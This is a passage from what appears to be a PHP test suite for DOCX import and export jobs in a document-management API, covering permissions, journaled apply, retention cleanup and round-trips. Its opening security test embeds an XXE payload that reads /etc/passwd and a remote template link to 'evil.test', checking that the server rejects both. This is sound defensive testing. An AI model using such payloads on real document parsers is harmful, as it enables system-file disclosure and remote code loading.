    AccessTestHelpers::grant($storage->rootNode, RoleRegistry::OWNER, subjectId: 1);

    $drive = app(Vaulter::class)->drive($storage)->actingAs($owner);
    $docs = app(DocumentsManager::class);
    $docNode = $docs->in($drive)->create('security-target', 'vaulter/rich-text', sampleRichDocument('Untouched safe text'));
    $before = $docs->in($drive)->content($docNode);

    $this->actingAs($owner);

    $xxeZip = makeDocxZip('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&x;</w:t></w:r></w:p></w:body></w:document>');
    $extRelZip = makeDocxZip(
        '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Hi</w:t></w:r></w:p></w:body></w:document>',
        '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.test/template.dotm" TargetMode="External"/></Relationships>',
    );

    $cases = [
        'corrupt' => 'not-a-valid-zip',
        'xxe' => $xxeZip,
        'ext-rel' => $extRelZip,
    ];

    foreach ($cases as $label => $bytes) {
        $res = $this->withHeaders(['Idempotency-Key' => 'sec-reg-'.$label])
            ->postJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs', [
                'request_key' => 'sec-'.$label,
                'kind' => 'import',
                'profile_id' => 'discussions',
                'docx_b64' => base64_encode($bytes),
            ])
            ->assertStatus(202);

        $jobId = (string) $res->json('data.id');
        expect($res->json('data.state'))->toBe('failed');

        // Refuses apply on failed unsafe job.
        $this->withHeaders(['Idempotency-Key' => 'sec-apply-'.$label])
            ->postJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$jobId.'/apply', [
                'apply_command_id' => 'apply-failed-'.$label,
            ])
            ->assertStatus(422)
            ->assertJsonPath('code', 'exchange_unsafe_archive');
    }

    $after = $docs->in($drive)->content($docNode);
    expect($after->stateVersion)->toBe($before->stateVersion)
        ->and(json_encode($after->content->toArray(), JSON_THROW_ON_ERROR))->toContain('Untouched safe text');
});

it('enforces ACL on import, export, download, preview, apply, and permission revocation mid-flight (10.2-B)', function (): void {
    $owner = AccessTestHelpers::user(1);
    $collab = AccessTestHelpers::user(2);

    $storage = AccessTestHelpers::storage();
    AccessTestHelpers::grant($storage->rootNode, RoleRegistry::OWNER, subjectId: 1);

    $ownerDrive = app(Vaulter::class)->drive($storage)->actingAs($owner);
    $docs = app(DocumentsManager::class);
    $docNode = $docs->in($ownerDrive)->create('acl-doc', 'vaulter/rich-text', sampleRichDocument('ACL guarded clause'));

    $readerGrant = AccessTestHelpers::grant($docNode, RoleRegistry::READER, scope: GrantScope::Item, subjectId: 2);

    // Reader cannot register an import job (requires Edit).
    $docxBytes = makeDocxZip('<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Unauthorized edit</w:t></w:r></w:p></w:body></w:document>');
    $this->actingAs($collab);
    $this->withHeaders(['Idempotency-Key' => 'reader-imp-denied'])
        ->post('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs', [
            'request_key' => 'reader-imp-denied',
            'kind' => 'import',
            'file' => UploadedFile::fake()->createWithContent('denied.docx', $docxBytes),
        ], ['Accept' => 'application/json'])
        ->assertForbidden();

    // Reader CAN register & download export while holding View + Download, and loses access when grant is revoked!
    $expRes = $this->withHeaders(['Idempotency-Key' => 'reader-exp-1'])
        ->postJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs', [
            'request_key' => 'reader-exp-1',
            'kind' => 'export',
            'profile_id' => 'standard',
        ])
        ->assertStatus(202)
        ->assertJsonPath('data.state', 'completed');
    $exportJobId = (string) $expRes->json('data.id');

    $this->get('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$exportJobId.'/file')->assertOk();

    // Grant Writer -> register import preview -> downgrade back to Reader -> apply MUST fail with 403!
    $ownerDrive->access()->revoke($docNode->id, $readerGrant->id);
    $writerGrant = AccessTestHelpers::grant($docNode, RoleRegistry::WRITER, scope: GrantScope::Item, subjectId: 2);

    $impRes = $this->withHeaders(['Idempotency-Key' => 'editor-imp-1'])
        ->post('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs', [
            'request_key' => 'editor-imp-1',
            'kind' => 'import',
            'profile_id' => 'standard',
            'file' => UploadedFile::fake()->createWithContent('editor.docx', $docxBytes),
        ], ['Accept' => 'application/json'])
        ->assertStatus(202)
        ->assertJsonPath('data.state', 'preview_ready');
    $importJobId = (string) $impRes->json('data.id');

    $ownerDrive->access()->revoke($docNode->id, $writerGrant->id);
    $downgradedGrant = AccessTestHelpers::grant($docNode, RoleRegistry::READER, scope: GrantScope::Item, subjectId: 2);

    $this->withHeaders(['Idempotency-Key' => 'downgraded-apply'])
        ->postJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$importJobId.'/apply', [
            'apply_command_id' => 'cmd-after-downgrade',
        ])
        ->assertForbidden();

    // Full revocation hides both job status and file download cleanly (404 node_not_found).
    $ownerDrive->access()->revoke($docNode->id, $downgradedGrant->id);
    $this->get('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$exportJobId.'/file')->assertNotFound();
    $this->getJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$exportJobId)->assertNotFound();
});

it('applies imports through the journal and recovers receipts after the head advances', function (string $scenario): void {
    $owner = AccessTestHelpers::user(1);
    $storage = AccessTestHelpers::storage();
    AccessTestHelpers::grant($storage->rootNode, RoleRegistry::OWNER, subjectId: 1);

    $drive = app(Vaulter::class)->drive($storage)->actingAs($owner);
    $docs = app(DocumentsManager::class);
    $db = app(VaulterDatabase::class);
    $tables = app(DatabaseOptions::class);

    $docNode = $docs->in($drive)->create('journal-doc', 'vaulter/rich-text', sampleRichDocument('Initial journal text'));
    $head = $docs->in($drive)->content($docNode);

    $this->actingAs($owner);
    $docxBytes = $scenario === 'legacy' ? makeDocxZip('<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Journal settled clause</w:t></w:r></w:p></w:body></w:document>') : file_get_contents(dirname(__DIR__, 4).'/tests/corpus/docx/d4-revisions.docx');
    expect($docxBytes)->toBeString();
    $reservations = app(PendingSuggestionReservations::class);
    $reg = $this->withHeaders(['Idempotency-Key' => 'journal-reg-1'])
        ->post('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs', [
            'request_key' => 'journal-imp-1',
            'kind' => 'import',
            'profile_id' => $scenario === 'legacy' ? 'standard' : 'revisions',
            'file' => UploadedFile::fake()->createWithContent('journal.docx', $docxBytes),
        ], ['Accept' => 'application/json'])
        ->assertStatus(202);

    $jobId = (string) $reg->json('data.id');

    $roomOwner = (string) Str::uuid();
    $db->transaction(static function () use ($db, $tables, $docNode, $roomOwner): void {
        $db->connection()->table($tables->table('documents'))
            ->where('node_id', $docNode->id)
            ->update(['write_mode' => 'journal']);

        $locked = app(CollaborativeState::class)->lock($docNode->id);
        app(RoomOwnership::class)->selectProfile($locked, strict: true);
        app(RoomOwnership::class)->acquire($locked, $roomOwner);
    });

    $update = static fn (string $payload, ?int $seed = null): UpdateEnvelope => new UpdateEnvelope(
        0,
        (string) Str::uuid(),
        $payload,
        hash('sha256', $payload),
        'server',
        $seed,
    );
    $commandId = 'journal-cmd-77';
    $applyUrl = 'api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$jobId.'/apply';
    $preview = $this->getJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$jobId)
        ->assertOk()->json('data.preview');
    if ($scenario === 'legacy') {
        // Recreate the pre-fix crash window: a durable command exists with no job link.
        app(UpdateLog::class)->appendFenced($docNode->id, $update('seed', 1), $roomOwner, 1, 0, static fn () => null);
        $principal = Actor::user($owner)->ref();
        $actor = new CommandActor(
            $principal, $storage->tenantId === null ? null : (string) $storage->tenantId,
            'drive:'.$storage->id, $principal->type.':'.$principal->id, (string) $storage->id, $docNode->id,
        );
        $hash = hash('sha256', 'proposal:'.$jobId.':'.$commandId);
        $proposal = sprintf('%s-%s-4%s-%04x-%s', substr($hash, 0, 8), substr($hash, 8, 4),
            substr($hash, 13, 3), (hexdec(substr($hash, 16, 4)) & 0x3FFF) | 0x8000, substr($hash, 20, 12));
        app(CommandJournal::class)->register(
            scope: $actor,
            key: $commandId,
            proposal: $proposal,
            digest: CanonicalJson::sha256Hex([
                'exchange_job_id' => $jobId,
                'document_id' => $head->documentId,
                'apply_command_id' => $commandId,
                'generation' => 0,
                'position' => 1,
                'document' => $preview,
            ]),
            generation: 0,
            schema: $head->schemaVersion,
            readPosition: 1,
            intent: [
                'operation' => 'exchange.apply_import',
                'exchange_job_id' => $jobId,
                'format' => 'docx',
                'profile_id' => 'standard',
                'document' => $preview,
            ],
        );
    } else {
        $this->withHeaders(['Idempotency-Key' => 'journal-wrong-position'])
            ->postJson($applyUrl, ['apply_command_id' => $commandId, 'expected_position' => 2])
            ->assertStatus(409)
            ->assertJsonPath('code', 'exchange_stale_preview');
        expect(app(ExchangeJobRepository::class)->findById($jobId)?->applyCommandId)->toBeNull();

        $this->withHeaders(['Idempotency-Key' => 'journal-new'])
            ->postJson($applyUrl, ['apply_command_id' => $commandId, 'expected_position' => 1])
            ->assertStatus(202)
            ->assertJsonPath('data.pending_commit', true)
            ->assertJsonPath('data.replayed', false);
        expect(app(ExchangeJobRepository::class)->findById($jobId)?->applyCommandId)->toBe($commandId)
            ->and($reservations->count((string) $head->documentId, 0))->toBe(5);
        $this->withHeaders(['Idempotency-Key' => 'journal-pending-replay'])
            ->postJson($applyUrl, ['apply_command_id' => $commandId, 'expected_position' => 1])
            ->assertAccepted()->assertJsonPath('data.replayed', true);
        expect($reservations->count((string) $head->documentId, 0))->toBe(5);
        DB::table($tables->table('document_exchange_jobs'))->where('id', $jobId)->update(['updated_at' => now()->subDays(8)]);
        expect(app(ExchangeJobRepository::class)->purgeExpired(7 * 86400))->toBe(0);
        app(UpdateLog::class)->appendFenced($docNode->id, $update('seed', 1), $roomOwner, 1, 0, static fn () => null);
    }

    // Room owner discovers next pending intent and settles it into UpdateLog + durable receipt.
    $nextIntent = $db->transaction(static fn (): ?array => app(CommandJournal::class)->next(app(CollaborativeState::class)->lock($docNode->id)));
    expect($nextIntent)->not->toBeNull();
    if ($scenario !== 'legacy') {
        expect($nextIntent['intent']['base_generation'])->toBe(0)
            ->and($nextIntent['intent']['base_position'])->toBe(1)
            ->and($nextIntent['intent']['atomic_effects'])->toHaveCount(1);
        $effect = $nextIntent['intent']['atomic_effects'][0];
        expect($effect['effect'])->toBe('exchange.apply_import')
            ->and(CanonicalJson::sha256Hex($effect['replacement']))->toBe(CanonicalJson::sha256Hex($preview));
    }

    $stale = $scenario === 'stale';
    if ($stale) {
        app(UpdateLog::class)->appendFenced($docNode->id, $update('interleaving-edit'), $roomOwner, 1, 1, static fn () => null);
    }

    $settled = app(CommandJournal::class)->settle(
        id: (string) $nextIntent['id'],
        owner: $roomOwner,
        fence: 1,
        generation: 0,
        base: $stale ? 2 : 1,
        fingerprint: (string) $nextIntent['fingerprint'],
        updates: $stale ? [] : [$update('apply-docx-commit')],
        evidence: ['ranges' => []],
        reject: $stale ? 'precondition_failed' : null,
    );

    if ($stale) {
        expect($settled['state'])->toBe('rejected')
            ->and($reservations->count((string) $head->documentId, 0))->toBe(0);
        $this->withHeaders(['Idempotency-Key' => 'journal-apply-after-conflict'])
            ->postJson($applyUrl, ['apply_command_id' => $commandId])
            ->assertStatus(409)
            ->assertJsonPath('code', 'exchange_stale_preview');
        expect(app(ExchangeJobRepository::class)->findById($jobId)?->state)->toBe(ExchangeJobState::PreviewReady);

        return;
    }

    expect($settled['state'])->toBe('committed')
        ->and($settled['receipt_id'])->toBeString()
        ->and($reservations->count((string) $head->documentId, 0))->toBe($scenario === 'legacy' ? 0 : 5);

    DB::table($tables->table('documents'))->where('node_id', $docNode->id)->update(['state_version' => 19]);
    if ($scenario === 'legacy') {
        $this->withHeaders(['Idempotency-Key' => 'journal-stale'])
            ->postJson($applyUrl, ['apply_command_id' => 'different-command', 'expected_position' => 2])
            ->assertStatus(409)
            ->assertJsonPath('code', 'exchange_stale_preview');
    }

    $this->withHeaders(['Idempotency-Key' => 'journal-apply-after-settle'])
        ->postJson($applyUrl, ['apply_command_id' => $commandId])
        ->assertOk()
        ->assertJsonPath('data.state', 'applied')
        ->assertJsonPath('data.apply_receipt_id', $settled['receipt_id'])
        ->assertJsonPath('data.position', $settled['to_seq'])
        ->assertJsonPath('data.replayed', true);

    $this->withHeaders(['Idempotency-Key' => 'journal-apply-after-recovery'])
        ->postJson($applyUrl, ['apply_command_id' => $commandId])
        ->assertOk()
        ->assertJsonPath('data.apply_receipt_id', $settled['receipt_id'])
        ->assertJsonPath('data.generation', $settled['generation'])
        ->assertJsonPath('data.position', $settled['to_seq'])
        ->assertJsonPath('data.replayed', true);

    $this->getJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$jobId)
        ->assertOk()
        ->assertJsonPath('data.state', 'applied')
        ->assertJsonPath('data.apply_receipt_id', $settled['receipt_id']);
    expect($reservations->count((string) $head->documentId, 0))->toBe(0)
        ->and(DB::table($tables->table('document_suggestions'))->where('document_id', $head->documentId)->count())->toBe($scenario === 'legacy' ? 0 : 5);
})->with(['new', 'legacy', 'stale']);

it('releases exchange source/output pins on document trash purge and retention cleanup without touching sibling docs', function (): void {
    $owner = AccessTestHelpers::user(1);
    $storage = AccessTestHelpers::storage();
    AccessTestHelpers::grant($storage->rootNode, RoleRegistry::OWNER, subjectId: 1);

    $drive = app(Vaulter::class)->drive($storage)->actingAs($owner);
    $docs = app(DocumentsManager::class);
    $pins = app(BlobPins::class);

    $doomed = $docs->in($drive)->create('doomed-doc', 'vaulter/rich-text', sampleRichDocument('Doomed text'));
    $survivor = $docs->in($drive)->create('survivor-doc', 'vaulter/rich-text', sampleRichDocument('Survivor text'));

    $this->actingAs($owner);
    $doomedRes = $this->withHeaders(['Idempotency-Key' => 'purge-exp-doomed'])
        ->postJson('api/vaulter/v1/documents/'.$doomed->id.'/exchange-jobs', [
            'request_key' => 'purge-exp-doomed',
            'kind' => 'export',
            'profile_id' => 'standard',
        ])
        ->assertStatus(202);
    $doomedJobId = (string) $doomedRes->json('data.id');

    $survRes = $this->withHeaders(['Idempotency-Key' => 'purge-exp-survivor'])
        ->postJson('api/vaulter/v1/documents/'.$survivor->id.'/exchange-jobs', [
            'request_key' => 'purge-exp-survivor',
            'kind' => 'export',
            'profile_id' => 'standard',
        ])
        ->assertStatus(202);
    $survJobId = (string) $survRes->json('data.id');

    expect($pins->countByOwner()[ExchangeJobRepository::SOURCE_PIN_OWNER] ?? 0)->toBe(2)
        ->and($pins->countByOwner()[ExchangeJobRepository::OUTPUT_PIN_OWNER] ?? 0)->toBe(2);

    $drive->nodes()->trash($doomed->id);
    $jobs = app(ExchangeJobRepository::class);
    $trash = $drive->withIdempotencyKey('nested-purge')->trash();
    expect(fn () => app(VaulterDatabase::class)->transaction(function () use ($trash, $jobs, $pins, $doomedJobId): void {
        expect($trash->empty())->toBe(1)
            ->and($jobs->findById($doomedJobId))->toBeNull()
            ->and($pins->countByOwner()[ExchangeJobRepository::SOURCE_PIN_OWNER] ?? 0)->toBe(1)
            ->and($pins->countByOwner()[ExchangeJobRepository::OUTPUT_PIN_OWNER] ?? 0)->toBe(1);

        throw new RuntimeException('Rollback the purge');
    }))->toThrow(RuntimeException::class, 'Rollback the purge');

    expect($jobs->findById($doomedJobId))->not->toBeNull()
        ->and($pins->countByOwner()[ExchangeJobRepository::SOURCE_PIN_OWNER] ?? 0)->toBe(2)
        ->and($pins->countByOwner()[ExchangeJobRepository::OUTPUT_PIN_OWNER] ?? 0)->toBe(2);

    expect($trash->empty())->toBe(1)
        ->and($jobs->findById($doomedJobId))->toBeNull();

    // Doomed document's job & pins are released while survivor keeps its 1+1 pins intact.
    expect($pins->countByOwner()[ExchangeJobRepository::SOURCE_PIN_OWNER] ?? 0)->toBe(1)
        ->and($pins->countByOwner()[ExchangeJobRepository::OUTPUT_PIN_OWNER] ?? 0)->toBe(1);

    // Advance clock past retention window and verify purgeExpiredJobs releases survivor pins & deletes row.
    Carbon::setTestNow(Carbon::now('UTC')->addDays(10));
    try {
        $purged = app(ExchangeManager::class)->purgeExpiredJobs(retentionSeconds: 86_400, limit: 50);
        expect($purged)->toBe(1)
            ->and(app(ExchangeJobRepository::class)->findById($survJobId))->toBeNull()
            ->and($pins->countByOwner()[ExchangeJobRepository::SOURCE_PIN_OWNER] ?? 0)->toBe(0)
            ->and($pins->countByOwner()[ExchangeJobRepository::OUTPUT_PIN_OWNER] ?? 0)->toBe(0);
    } finally {
        Carbon::setTestNow();
    }

    // Confirm ApplyExchangeImportInput is constructible and referenced cleanly.
    $input = new ApplyExchangeImportInput('noop-cmd');
    expect($input->applyCommandId)->toBe('noop-cmd');
});

it('uses temp files and reuses a persistent node worker across export/import calls when enabled', function (): void {
    $options = new ExchangeOptions(
        cliPath: dirname(__DIR__, 3).'/docx/dist/cli.js',
        persistentWorker: true,
    );
    $runtime = new NodeDocxExchangeRuntime($options);

    try {
        $exp = $runtime->exportDocx(sampleRichDocument('Persistent worker clause'), 'standard');
        expect($exp->blocked)->toBeFalse()
            ->and($exp->docxBytes)->toBeString()
            ->and(substr((string) $exp->docxBytes, 0, 2))->toBe('PK');

        $imp = $runtime->importDocx((string) $exp->docxBytes, 'standard');
        expect($imp->blocked)->toBeFalse()
            ->and(json_encode($imp->document, JSON_THROW_ON_ERROR))->toContain('Persistent worker clause');
    } finally {
        $runtime->shutdown();
    }
});

it('roundtrips D2 sections, D3 discussions, and D4 tracked changes through server import, apply, and export', function (): void {
    $owner = AccessTestHelpers::user(1);
    $storage = AccessTestHelpers::storage();
    AccessTestHelpers::grant($storage->rootNode, RoleRegistry::OWNER, subjectId: 1);
    $drive = app(Vaulter::class)->drive($storage)->actingAs($owner);
    $docs = app(DocumentsManager::class)->in($drive);
    $tables = app(DatabaseOptions::class);
    $this->actingAs($owner);

    // 1. D2 Sections roundtrip
    $d2Doc = $docs->create('d2-server-doc', 'vaulter/rich-text', sampleRichDocument('D2 placeholder'));
    $d2Bytes = file_get_contents(dirname(__DIR__, 4).'/tests/corpus/docx/d2-sections.docx');
    expect($d2Bytes)->toBeString();
    $d2Url = 'api/vaulter/v1/documents/'.$d2Doc->id.'/exchange-jobs';
    $d2Imp = $this->withHeaders(['Idempotency-Key' => 'd2-imp'])
        ->postJson($d2Url, ['kind' => 'import', 'profile_id' => 'discussions', 'docx_b64' => base64_encode($d2Bytes)])
        ->assertStatus(202);
    $this->withHeaders(['Idempotency-Key' => 'd2-apply'])
        ->postJson($d2Url.'/'.$d2Imp->json('data.id').'/apply', ['apply_command_id' => 'd2-cmd'])
        ->assertOk()
        ->assertJsonPath('data.state', 'applied');
    expect(DB::table($tables->table('document_sections'))->count())->toBe(1);

    $d2Exp = $this->withHeaders(['Idempotency-Key' => 'd2-exp'])
        ->postJson($d2Url, ['kind' => 'export', 'profile_id' => 'discussions'])
        ->assertStatus(202);
    expect(array_column($d2Exp->json('data.diagnostics_report.diagnostics') ?? [], 'code'))->not->toContain('body_only_export');
    $d2OutBytes = $this->get($d2Url.'/'.$d2Exp->json('data.id').'/file')->assertOk()->streamedContent();
    $d2Reimp = app(NodeDocxExchangeRuntime::class)->importDocx($d2OutBytes, 'discussions');
    expect($d2Reimp->sections)->toHaveCount(2);

    // 2. D3 Discussions roundtrip
    $d3Doc = $docs->create('d3-server-doc', 'vaulter/rich-text', sampleRichDocument('D3 placeholder'));
    $d3Bytes = file_get_contents(dirname(__DIR__, 4).'/tests/corpus/docx/d3-discussions.docx');
    expect($d3Bytes)->toBeString();
    $d3Url = 'api/vaulter/v1/documents/'.$d3Doc->id.'/exchange-jobs';
    $d3Imp = $this->withHeaders(['Idempotency-Key' => 'd3-imp'])
        ->postJson($d3Url, ['kind' => 'import', 'profile_id' => 'discussions', 'docx_b64' => base64_encode($d3Bytes)])
        ->assertStatus(202);
    $this->withHeaders(['Idempotency-Key' => 'd3-apply'])
        ->postJson($d3Url.'/'.$d3Imp->json('data.id').'/apply', ['apply_command_id' => 'd3-cmd'])
        ->assertOk();
    expect(DB::table($tables->table('node_comments'))->where('node_id', $d3Doc->id)->count())->toBe(5)
        ->and(DB::table($tables->table('document_comment_anchors'))->count())->toBe(3);

    $d3Exp = $this->withHeaders(['Idempotency-Key' => 'd3-exp'])
        ->postJson($d3Url, ['kind' => 'export', 'profile_id' => 'discussions'])
        ->assertStatus(202);
    expect(array_column($d3Exp->json('data.diagnostics_report.diagnostics') ?? [], 'code'))->not->toContain('body_only_export');
    $d3OutBytes = $this->get($d3Url.'/'.$d3Exp->json('data.id').'/file')->assertOk()->streamedContent();
    $d3Reimp = app(NodeDocxExchangeRuntime::class)->importDocx($d3OutBytes, 'discussions');
    expect($d3Reimp->discussions)->toHaveCount(3);

    // 3. D4 Revisions roundtrip + review projection
    $d4Doc = $docs->create('d4-server-doc', 'vaulter/rich-text', sampleRichDocument('D4 placeholder'));
    $d4Bytes = file_get_contents(dirname(__DIR__, 4).'/tests/corpus/docx/d4-revisions.docx');
    expect($d4Bytes)->toBeString();
    $d4Url = 'api/vaulter/v1/documents/'.$d4Doc->id.'/exchange-jobs';
    $d4Imp = $this->withHeaders(['Idempotency-Key' => 'd4-imp'])
        ->postJson($d4Url, ['kind' => 'import', 'profile_id' => 'revisions', 'docx_b64' => base64_encode($d4Bytes)])
        ->assertStatus(202);
    $this->withHeaders(['Idempotency-Key' => 'd4-apply'])
        ->postJson($d4Url.'/'.$d4Imp->json('data.id').'/apply', ['apply_command_id' => 'd4-cmd'])
        ->assertOk();
    expect(DB::table($tables->table('document_suggestions'))->count())->toBe(5)
        ->and(json_encode($docs->content($d4Doc)->content->toArray(), JSON_THROW_ON_ERROR))->not->toContain('added clause');

    $d4Exp = $this->withHeaders(['Idempotency-Key' => 'd4-exp-review'])
        ->postJson($d4Url, ['kind' => 'export', 'profile_id' => 'revisions', 'options' => ['projection' => 'review']])
        ->assertStatus(202);
    expect(array_column($d4Exp->json('data.diagnostics_report.diagnostics') ?? [], 'code'))->not->toContain('body_only_export');
    $d4OutBytes = $this->get($d4Url.'/'.$d4Exp->json('data.id').'/file')->assertOk()->streamedContent();
    $d4Reimp = app(NodeDocxExchangeRuntime::class)->importDocx($d4OutBytes, 'revisions');
    expect($d4Reimp->revisions)->toHaveCount(5);
});

it('rolls back the document and job when a snapshot import exceeds the open suggestion limit', function (): void {
    $owner = AccessTestHelpers::user(1);
    $storage = AccessTestHelpers::storage();
    AccessTestHelpers::grant($storage->rootNode, RoleRegistry::OWNER, subjectId: 1);
    $drive = app(Vaulter::class)->drive($storage)->actingAs($owner);
    $docs = app(DocumentsManager::class)->in($drive);
    $node = $docs->create('snapshot quota', 'vaulter/rich-text', sampleRichDocument('Original head'));
    $before = $docs->content($node);
    $revision = ['kind' => 'insert', 'block_index' => 0];
    $result = new ExchangeRuntimeImportResult(false, '', sampleRichDocument('Import head'), [],
        revisions: array_fill(0, 1001, $revision));
    $runtime = Mockery::mock(DocxExchangeRuntime::class);
    $runtime->shouldReceive('importDocx')->once()->andReturn($result);
    app()->instance(DocxExchangeRuntime::class, $runtime);
    $url = 'api/vaulter/v1/documents/'.$node->id.'/exchange-jobs';
    $bytes = file_get_contents(dirname(__DIR__, 4).'/tests/corpus/docx/d4-revisions.docx');
    $job = $this->actingAs($owner)->withHeaders(['Idempotency-Key' => 'quota-reg'])
        ->postJson($url, ['kind' => 'import', 'profile_id' => 'revisions', 'docx_b64' => base64_encode($bytes)])
        ->assertAccepted()->assertJsonPath('data.state', 'preview_ready')->json('data.id');
    $this->withHeaders(['Idempotency-Key' => 'quota-apply'])
        ->postJson($url.'/'.$job.'/apply', ['apply_command_id' => 'quota-cmd'])
        ->assertUnprocessable()->assertJsonPath('code', 'exchange_invalid_command')->assertJsonPath('meta.reason', 'open_suggestion_limit');
    expect($docs->content($node)->stateVersion)->toBe($before->stateVersion)
        ->and($docs->content($node)->content->toArray())->toBe($before->content->toArray())
        ->and(app(ExchangeJobRepository::class)->findById($job)?->state)->toBe(ExchangeJobState::PreviewReady)
        ->and(DB::table(app(DatabaseOptions::class)->table('document_suggestions'))->count())->toBe(0);
});

it('persists D2, D3, and D4 state atomically only when journal import settles', function (): void {
    $owner = AccessTestHelpers::user(1);
    $storage = AccessTestHelpers::storage();
    AccessTestHelpers::grant($storage->rootNode, RoleRegistry::OWNER, subjectId: 1);
    $drive = app(Vaulter::class)->drive($storage)->actingAs($owner);
    $docs = app(DocumentsManager::class)->in($drive);
    $db = app(VaulterDatabase::class);
    $tables = app(DatabaseOptions::class);

    $docNode = $docs->create('journal-d3-doc', 'vaulter/rich-text', sampleRichDocument('Initial journal text'));
    $this->actingAs($owner);
    $d3Bytes = file_get_contents(dirname(__DIR__, 4).'/tests/corpus/docx/d3-discussions.docx');
    expect($d3Bytes)->toBeString();
    $url = 'api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs';
    $reg = $this->withHeaders(['Idempotency-Key' => 'journal-d3-reg'])
        ->postJson($url, ['kind' => 'import', 'profile_id' => 'discussions', 'docx_b64' => base64_encode($d3Bytes)])
        ->assertStatus(202);
    $jobId = (string) $reg->json('data.id');

    $roomOwner = (string) Str::uuid();
    $db->transaction(static function () use ($db, $tables, $docNode, $roomOwner): void {
        $db->connection()->table($tables->table('documents'))->where('node_id', $docNode->id)->update(['write_mode' => 'journal']);
        $locked = app(CollaborativeState::class)->lock($docNode->id);
        app(RoomOwnership::class)->selectProfile($locked, strict: true);
        app(RoomOwnership::class)->acquire($locked, $roomOwner);
    });

    $this->withHeaders(['Idempotency-Key' => 'journal-d3-apply'])
        ->postJson($url.'/'.$jobId.'/apply', ['apply_command_id' => 'journal-d3-cmd', 'expected_position' => 1])
        ->assertStatus(202)
        ->assertJsonPath('data.pending_commit', true);

    expect(DB::table($tables->table('node_comments'))->where('node_id', $docNode->id)->count())->toBe(0);

    $seed = 'seed';
    app(UpdateLog::class)->appendFenced(
        $docNode->id,
        new UpdateEnvelope(0, (string) Str::uuid(), $seed, hash('sha256', $seed), 'server', 1),
        $roomOwner, 1, 0, static fn () => null,
    );
    $nextIntent = $db->transaction(static fn (): ?array => app(CommandJournal::class)->next(app(CollaborativeState::class)->lock($docNode->id)));
    expect($nextIntent)->not->toBeNull();
    $settled = app(CommandJournal::class)->settle(
        id: (string) $nextIntent['id'],
        owner: $roomOwner,
        fence: 1,
        generation: 0,
        base: 1,
        fingerprint: (string) $nextIntent['fingerprint'],
        updates: [new UpdateEnvelope(0, (string) Str::uuid(), 'commit', hash('sha256', 'commit'), 'server', null)],
        evidence: ['ranges' => []],
    );
    expect($settled['state'])->toBe('committed');
    DB::table($tables->table('documents'))->where('node_id', $docNode->id)->update(['state_version' => 2]);

    $this->getJson($url.'/'.$jobId)
        ->assertOk()
        ->assertJsonPath('data.state', 'applied');
    expect(DB::table($tables->table('node_comments'))->where('node_id', $docNode->id)->count())->toBe(5)
        ->and(DB::table($tables->table('document_comment_anchors'))->count())->toBe(3)
        ->and(DB::table($tables->table('document_sections'))->count())->toBe(1);
});

it('resumes the MySQL exchange table migration without losing existing jobs', function (): void {
    $owner = AccessTestHelpers::user(1);
    $storage = AccessTestHelpers::storage();
    AccessTestHelpers::grant($storage->rootNode, RoleRegistry::OWNER, subjectId: 1);
    $drive = app(Vaulter::class)->drive($storage)->actingAs($owner);
    $node = app(DocumentsManager::class)->in($drive)->create('migration fixture', 'vaulter/rich-text', sampleRichDocument());
    $job = $this->actingAs($owner)->withHeaders(['Idempotency-Key' => 'migration-case'])
        ->postJson('api/vaulter/v1/documents/'.$node->id.'/exchange-jobs', [
            'request_key' => 'migration-case', 'kind' => 'export', 'profile_id' => 'standard',
        ])->assertAccepted()->json('data.id');
    $conn = app(VaulterDatabase::class)->connection();
    $name = app(DatabaseOptions::class)->table('document_exchange_jobs');
    $schema = $conn->getSchemaBuilder();
    $schema->table($name, static function (Blueprint $table) use ($name): void {
        $table->dropForeign($name.'_source_rev_fk');
        $table->dropUnique($name.'_uniq');
        $table->string('project_scope', 255)->change();
        $table->string('effective_subject', 255)->change();
        $table->string('request_key', 255)->change();
    });
    $migration = app(ExchangeSchema::class);
    $migration->create('document_exchange_jobs');
    $migration->upgradeMysqlJobKeys();
    expect($schema->hasIndex($name, $name.'_uniq', 'unique'))->toBeTrue()
        ->and($schema->hasForeignKey($name, ['source_revision_id']))->toBeTrue()
        ->and($conn->table($name)->where('request_key', 'migration-case')->value('id'))->toBe($job)
        ->and($conn->table($name)->where('request_key', 'MIGRATION-CASE')->exists())->toBeFalse();
})->group('engine:mysql');
